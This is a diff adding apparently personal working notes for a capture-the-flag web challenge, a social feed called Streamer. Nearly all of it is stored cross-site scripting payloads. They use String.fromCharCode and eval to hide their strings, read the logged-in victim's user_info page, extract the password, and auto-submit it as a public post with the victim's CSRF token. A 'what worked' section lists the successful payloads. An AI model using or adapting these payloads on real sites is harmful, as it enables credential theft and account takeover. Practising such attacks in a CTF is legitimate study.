@@ -1,0 +1,123 @@
+encode data 
+
+function encode (str) { var s=""; for (i=0;i<=str.length-1;i++) { s+=str.charCodeAt(i); s+="," } return s; }
+
+encode("hello")
+"104,101,108,108,111,"
+
+String.fromCharCode(104,101,108,108,111);
+"hello"
+
+thething
+<script>function craft(body) {return String.fromCharCode(60,116,114,62,60,116,104,62,115,111,109,101,98,111,100,121,60,47,116,104,62,60,116,100,62,60,104,52,62,104,101,114,101,32,119,101,32,103,111,60,47,104,52,62) + body + String.fromCharCode(60,47,116,100,62,60,47,116,114,62); } $.post(String.fromCharCode(117,115,101,114,95,100,97,116,97), function(data){$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), {}, function(res){ new_element=craft(res);$(String.fromCharCode(35,112,111,115,116,115,32,62,116,98,111,100,121,58,108,97,115,116)).prepend(new_element); }); }); </script>
+
+counter = 0; function doWork() { post(); counter += 1; if (counter < 4) { setTimeout(doWork, 1); } }; setTimeout(doWork, 1);
+
+
+<script> function craft(body) {return String.fromCharCode(60,116,114,62,60,116,104,62,115,111,109,101,98,111,100,121,60,47,116,104,62,60,116,100,62,60,104,52,62,104,101,114,101,32,119,101,32,103,111,60,47,104,52,62) + body + String.fromCharCode(60,47,116,100,62,60,47,116,114,62); } 
+function post() {$.post(String.fromCharCode(117,115,101,114,95,100,97,116,97), function(data){$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), {}, function(res){ new_element=craft(res);$(String.fromCharCode(35,112,111,115,116,115,32,62,116,98,111,100,121,58,108,97,115,116)).prepend(new_element); }); });
+done = true;}
+counter = 0; function doWork() { post(); counter += 1; if (counter < 4) { setTimeout(doWork, 1); } }; setTimeout(doWork, 1);
+doWork();</script>
+
+<script>function create_new_element(body) {return '<tr><th>' +item['user'] +
+            '</th><td><h4>' + "here we go" + '</h4>' +
+            body + '</td></tr>'; } $.post(String.fromCharCode(117,115,101,114,95,100,97,116,97), function(data){$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), {}, function(results){ new_element=create_new_element(results);$('#posts >tbody:last').prepend(new_element); }); }); </script>
+
+get data
+
+$.get("user_info", {}, function(results){ alert(results); });
+
+post data
+
+user_data = [{"id":null,"user":"level07-password-holder","title":"Hello World","body":"Welcome to Streamer, the most streamlined way of sharing\nupdates with your friends!\n\nOne great feature of Streamer is that no password resets are needed. I, for\nexample, have a very complicated password (including apostrophes, quotes, you\nname it!). But I remember it by clicking my name on the right-hand side and\nseeing what my password is.\n\nNote also that Streamer can run entirely within your corporate firewall. My\nmachine, for example, can only talk directly to the Streamer server itself!","time":"2012-08-26 20:37:19 -0400"}];
+
+$.post("user_data", function(data){alert(data);});
+
+var new_element = '<tr><th>' +item['user'] +
+            '</th><td><h4>' + "here we go" + '</h4>' +
+            item['body'] + '</td></tr>';
+        $('#posts > tbody:last').prepend(new_element);
+
+function create_new_element(body) {return '<tr><th>' +item['user'] +
+            '</th><td><h4>' + "here we go" + '</h4>' +
+            body + '</td></tr>'; }
+
+i = create_new_element("ooooooooooooooooooooo");
+
+
+So posting with post:
+1. get csrf token by making a post
+how do i get this for another user?
+
+var new_post_data = {
+            title: "new",
+            body: "post",
+            _csrf: "ysAd70fi8c3IKtDjOZJyEEuir/wIlhheYkHR7jJEuwA="};
+
+$.post('/user-wvmwxvchwk/ajax/posts',
+                 new_post_data,
+                 function(data) {
+            var status_text = $.parseJSON(data);
+            $('#status').html(status_text['response']);
+new_post_data['user'] = "some";
+            addPost(new_post_data);
+          });
+
+//////////////////////////
+
+function(secrets) { var new_post_data = { title: "new", body: secrets, _csrf: $("#new_post").get(0).childNodes[1].value }; } $.post("ajax/posts", new_post_data, function(data) { var status_text = $.parseJSON(data); $("#status").html(status_text["response"]); new_post_data["user"] = "some"; addPost(new_post_data); });
+
+<script>eval(String.fromCharCode(102,117,110,99,116,105,111,110,40,115,101,99,114,101,116,115,41,32,123,32,118,97,114,32,110,101,119,95,112,111,115,116,95,100,97,116,97,32,61,32,123,32,116,105,116,108,101,58,32,34,110,101,119,34,44,32,98,111,100,121,58,32,115,101,99,114,101,116,115,44,32,95,99,115,114,102,58,32,36,40,34,35,110,101,119,95,112,111,115,116,34,41,46,103,101,116,40,48,41,46,99,104,105,108,100,78,111,100,101,115,91,49,93,46,118,97,108,117,101,32,125,59,32,125,32,36,46,112,111,115,116,40,34,97,106,97,120,47,112,111,115,116,115,34,44,32,110,101,119,95,112,111,115,116,95,100,97,116,97,44,32,102,117,110,99,116,105,111,110,40,100,97,116,97,41,32,123,32,118,97,114,32,115,116,97,116,117,115,95,116,101,120,116,32,61,32,36,46,112,97,114,115,101,74,83,79,78,40,100,97,116,97,41,59,32,36,40,34,35,115,116,97,116,117,115,34,41,46,104,116,109,108,40,115,116,97,116,117,115,95,116,101,120,116,91,34,114,101,115,112,111,110,115,101,34,93,41,59,32,110,101,119,95,112,111,115,116,95,100,97,116,97,91,34,117,115,101,114,34,93,32,61,32,34,115,111,109,101,34,59,32,97,100,100,80,111,115,116,40,110,101,119,95,112,111,115,116,95,100,97,116,97,41,59,32,125,41,59))</script>
+
+
+$.get("user_info", function(data){ password = ""; for (var i = data.search("<th>Password:");i<data.search("<th>Password:")+20;i++){ console.log(i); password+=data.charAt(i); };	console.log(password); var new_post_data = { title:"new", body: password, _csrf: $("#new_post").get(0).childNodes[1].value, } $.post("ajax/posts", new_post_data, function(d2) { var status_text = $.parseJSON(data); $("#status").html(status_text["response"]); new_post_data["user"] = "some"; addPost(new_post_data); }); });
+
+<script>eval(String.fromCharCode(36,46,103,101,116,40,34,117,115,101,114,95,105,110,102,111,34,44,32,102,117,110,99,116,105,111,110,40,100,97,116,97,41,123,32,112,97,115,115,119,111,114,100,32,61,32,34,34,59,32,102,111,114,32,40,118,97,114,32,105,32,61,32,100,97,116,97,46,115,101,97,114,99,104,40,34,60,116,104,62,80,97,115,115,119,111,114,100,58,34,41,59,105,60,100,97,116,97,46,115,101,97,114,99,104,40,34,60,116,104,62,80,97,115,115,119,111,114,100,58,34,41,43,50,48,59,105,43,43,41,123,32,99,111,110,115,111,108,101,46,108,111,103,40,105,41,59,32,112,97,115,115,119,111,114,100,43,61,100,97,116,97,46,99,104,97,114,65,116,40,105,41,59,32,125,59,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,112,97,115,115,119,111,114,100,41,59,32,118,97,114,32,110,101,119,95,112,111,115,116,95,100,97,116,97,32,61,32,123,32,116,105,116,108,101,58,34,110,101,119,34,44,32,98,111,100,121,58,32,112,97,115,115,119,111,114,100,44,32,95,99,115,114,102,58,32,36,40,34,35,110,101,119,95,112,111,115,116,34,41,46,103,101,116,40,48,41,46,99,104,105,108,100,78,111,100,101,115,91,49,93,46,118,97,108,117,101,44,32,125,32,36,46,112,111,115,116,40,34,97,106,97,120,47,112,111,115,116,115,34,44,32,110,101,119,95,112,111,115,116,95,100,97,116,97,44,32,102,117,110,99,116,105,111,110,40,100,50,41,32,123,32,118,97,114,32,115,116,97,116,117,115,95,116,101,120,116,32,61,32,36,46,112,97,114,115,101,74,83,79,78,40,100,97,116,97,41,59,32,36,40,34,35,115,116,97,116,117,115,34,41,46,104,116,109,108,40,115,116,97,116,117,115,95,116,101,120,116,91,34,114,101,115,112,111,110,115,101,34,93,41,59,32,110,101,119,95,112,111,115,116,95,100,97,116,97,91,34,117,115,101,114,34,93,32,61,32,34,115,111,109,101,34,59,32,97,100,100,80,111,115,116,40,110,101,119,95,112,111,115,116,95,100,97,116,97,41,59,32,125,41,59,32,125,41,59))</script>
+
+what worked:
+
+create an alert that says hello
+</script><script>alert(String.fromCharCode(104,101,108,108,111));</script>
+
+</script><script>$(alert(String.fromCharCode(104,101,108,108,111)));</script>
+
+create an alert with the userinfo page
+</script><script>$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data) {alert(data)});</script>
+
+create an alert with password
+</script><script>$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data) {alert($(data).find(String.fromCharCode(116,100)).text())});</script>
+
+create a post, empty
+</script><script>$(function () { $(String.fromCharCode(35,110,101,119,95,112,111,115,116)).submit(); });</script>
+
+create a post with password
+</script><script>$(function () {  $.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data) { $(String.fromCharCode(35,99,111,110,116,101,110,116)).val(escape($(data).find(String.fromCharCode(116,100)).text())); $(String.fromCharCode(35,110,101,119,95,112,111,115,116)).submit(); }) });</script>
+
+this did the trick!
+
+what did not yet:
+</script><script>function encode (str) { var s=String.fromCharCode(34,34); for (i=0;i<=str.length-1;i++) { s+=str.charCodeAt(i); s+=String.fromCharCode(34,44,34)} return s; } $(function () {  $.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data) { $(String.fromCharCode(35,99,111,110,116,101,110,116)).val(encode($(data).find(String.fromCharCode(116,100)).text())); $(String.fromCharCode(35,110,101,119,95,112,111,115,116)).submit(); }) });</script>
+///
+
+$.get("user_info", function(data) { $("#content").val($(data).find("td").text()); $("#title").val("my password"); $("#new_post").submit(); })
+
+Object
+function encode (str) { var s=""; for (i=0;i<=str.length-1;i++) { s+=str.charCodeAt(i); s+="," } return s; }
+undefined
+
+encode("user_info");
+String.fromCharCode(117,115,101,114,95,105,110,102,111)
+encode("#content");
+String.fromCharCode(35,99,111,110,116,101,110,116)
+encode("td");
+String.fromCharCode(116,100)
+encode("#title");
+String.fromCharCode(35,116,105,116,108,101)
+encode("my password");
+String.fromCharCode(109,121,32,112,97,115,115,119,111,114,100)
+encode("#new_post");
+String.fromCharCode(35,110,101,119,95,112,111,115,116)
+
+
+<script>$.get(String.fromCharCode(117,115,101,114,95,105,110,102,111), function(data) { $(String.fromCharCode(35,99,111,110,116,101,110,116)).val($(data).find(String.fromCharCode(116,100)).text()); $(String.fromCharCode(35,116,105,116,108,101)).val(String.fromCharCode(109,121,32,112,97,115,115,119,111,114,100)); $(String.fromCharCode(35,110,101,119,95,112,111,115,116)).submit(); })</script>
